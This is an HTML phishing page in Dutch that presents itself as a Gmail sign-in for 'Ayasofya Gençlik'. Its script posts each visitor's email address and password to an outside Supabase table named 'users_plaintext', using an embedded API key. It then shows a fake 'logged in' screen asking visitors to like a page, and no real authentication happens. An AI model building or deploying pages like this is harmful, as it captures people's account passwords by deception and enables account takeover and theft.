<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ayasofya Gençlik – Inloggen</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .page {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 120px;
      width: 100%;
      max-width: 900px;
    }

    /* ── LINKS ── */
    .left {
      flex-shrink: 0;
    }

    .left h1 {
      font-size: 48px;
      font-weight: 300;
      color: #1f1f1f;
      margin-bottom: 12px;
    }

    .left .subtitle {
      font-size: 16px;
      color: #444746;
    }

    /* ── RECHTS ── */
    .right {
      width: 100%;
      max-width: 400px;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 18px 14px 6px;
      border: 1px solid #747775;
      border-radius: 4px;
      font-size: 16px;
      color: #1f1f1f;
      outline: none;
      background: transparent;
      transition: border-color 0.2s;
    }

    .input-group input:focus {
      border-color: #1877F2;
      border-width: 2px;
    }

    .input-group label {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #444746;
      pointer-events: none;
      transition: all 0.15s ease;
      background: white;
      padding: 0 2px;
    }

    .input-group input:focus + label,
    .input-group input:not(:placeholder-shown) + label {
      top: 10px;
      font-size: 11px;
      color: #1877F2;
      transform: none;
    }

    .input-group input:not(:focus):not(:placeholder-shown) + label {
      color: #444746;
    }

    .forgot {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1877F2;
      text-decoration: none;
      margin-bottom: 28px;
    }

    .forgot:hover { text-decoration: underline; }

    .hint-text {
      font-size: 14px;
      color: #444746;
      margin-bottom: 32px;
      line-height: 1.5;
    }

    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .btn-create {
      font-size: 14px;
      font-weight: 600;
      color: #1877F2;
      background: none;
      border: none;
      cursor: pointer;
      padding: 10px 0;
    }

    .btn-create:hover { text-decoration: underline; }

    .btn-next {
      padding: 10px 28px;
      background-color: #1877F2;
      color: white;
      border: none;
      border-radius: 20px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-next:hover { background-color: #1565d8; }

    .message {
      font-size: 13px;
      color: #d93025;
      margin-top: 12px;
      min-height: 18px;
    }

    /* DASHBOARD */
    #dashboard-screen { display: none; min-height: 100vh; background: #fff; }

    .navbar {
      background: white;
      border-bottom: 1px solid #e0e0e0;
      padding: 0 32px;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .nav-brand { font-size: 20px; font-weight: 700; color: #1877F2; }
    .nav-right { display: flex; align-items: center; gap: 16px; }
    .nav-email { font-size: 14px; color: #5f6368; }

    .btn-logout {
      padding: 8px 20px;
      background: none;
      border: 1px solid #c4c7c5;
      border-radius: 20px;
      font-size: 14px;
      color: #1877F2;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-logout:hover { background: #f0f4f9; }

    .dashboard-body {
      max-width: 560px;
      margin: 60px auto;
      padding: 0 20px;
      text-align: center;
    }

    .dashboard-body h2 { font-size: 26px; font-weight: 400; color: #1f1f1f; margin-bottom: 8px; }
    .dashboard-body p { font-size: 15px; color: #5f6368; margin-bottom: 32px; }

    .like-box {
      background: #f0f4f9;
      border-radius: 16px;
      padding: 32px;
    }

    .like-box p { font-size: 16px; color: #1f1f1f; margin-bottom: 16px; }

    .btn-like {
      padding: 10px 28px;
      background: #1877F2;
      color: white;
      border: none;
      border-radius: 20px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-like:hover { background: #1565d8; }
    .btn-like.liked { background: #34a853; cursor: default; }

    footer {
      padding: 16px 24px;
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      color: #80868b;
      border-top: 1px solid #e0e0e0;
    }
  </style>
</head>
<body>

<!-- LOGIN -->
<div id="login-page">
  <div class="page">
    <div class="container">

      <!-- LINKS -->
      <div class="left">
        <h1>Inloggen</h1>
        <p class="subtitle">Gebruik je Gmail-account</p>
      </div>

      <!-- RECHTS -->
      <div class="right">
        <div class="input-group">
          <input type="email" id="email-input" placeholder=" " />
          <label>E-mailadres</label>
        </div>

        <div class="input-group">
          <input type="password" id="password-input" placeholder=" " />
          <label>Wachtwoord</label>
        </div>

        <a href="#" class="forgot">Wachtwoord vergeten?</a>

        <p class="hint-text">
          Niet jouw computer? Gebruik een privévenster om in te loggen.
        </p>

        <div class="actions">
          <button class="btn-create">Account aanmaken</button>
          <button class="btn-next" onclick="handleLogin()">Inloggen</button>
        </div>

        <div id="login-message" class="message"></div>
      </div>

    </div>
  </div>

  <footer>
    <span>Nederlands</span>
    <span>Privacy · Voorwaarden · Help</span>
  </footer>
</div>

<!-- DASHBOARD -->
<div id="dashboard-screen">
  <div class="navbar">
    <span class="nav-brand">Ayasofya Gençlik</span>
    <div class="nav-right">
      <span class="nav-email" id="nav-email"></span>
      <button class="btn-logout" onclick="handleLogout()">Uitloggen</button>
    </div>
  </div>
  <div class="dashboard-body">
    <h2 id="welcome-text">Welkom!</h2>
    <p>Je bent succesvol ingelogd.</p>
    <div class="like-box">
      <p>👍 Please like our page!</p>
      <button class="btn-like" id="like-btn" onclick="handleLike()">Like</button>
    </div>
  </div>
</div>

<script>
  const SUPABASE_URL = 'https://jhlcymefogldlulkplrk.supabase.co';
  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpobGN5bWVmb2dsZGx1bGtwbHJrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA0MjAyNjEsImV4cCI6MjA5NTk5NjI2MX0.wMeFPjffvDngfD2UO-g8zMwr8fDkCkhTvrvOyehmzVI';

  async function supabaseFetch(path, options = {}) {
    const url = `${SUPABASE_URL}/rest/v1/${path}`;
    const headers = {
      'apikey': SUPABASE_KEY,
      'Authorization': `Bearer ${SUPABASE_KEY}`,
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
      ...options.headers
    };
    const response = await fetch(url, { ...options, headers });
    const data = await response.json();
    return { status: response.status, data };
  }

  async function handleLogin() {
    const email = document.getElementById('email-input').value.trim();
    const password = document.getElementById('password-input').value;
    const msg = document.getElementById('login-message');
    msg.textContent = '';

    if (!email || !password) {
      msg.textContent = 'Vul je e-mailadres en wachtwoord in.';
      return;
    }

    const result = await supabaseFetch('users_plaintext', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    if (result.status === 201) {
      document.getElementById('welcome-text').textContent = `Welkom, ${email}!`;
      document.getElementById('nav-email').textContent = email;
      document.getElementById('login-page').style.display = 'none';
      document.getElementById('dashboard-screen').style.display = 'block';
    } else {
      msg.textContent = 'Er ging iets mis. Probeer een ander e-mailadres.';
      console.error(result.data);
    }
  }

  function handleLike() {
    const btn = document.getElementById('like-btn');
    btn.textContent = '👍 Liked!';
    btn.classList.add('liked');
    btn.disabled = true;
  }

  function handleLogout() {
    document.getElementById('email-input').value = '';
    document.getElementById('password-input').value = '';
    document.getElementById('login-message').textContent = '';
    document.getElementById('login-page').style.display = 'flex';
    document.getElementById('dashboard-screen').style.display = 'none';
    document.getElementById('like-btn').textContent = 'Like';
    document.getElementById('like-btn').classList.remove('liked');
    document.getElementById('like-btn').disabled = false;
  }

  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') handleLogin();
  });
</script>

</body>
</html>
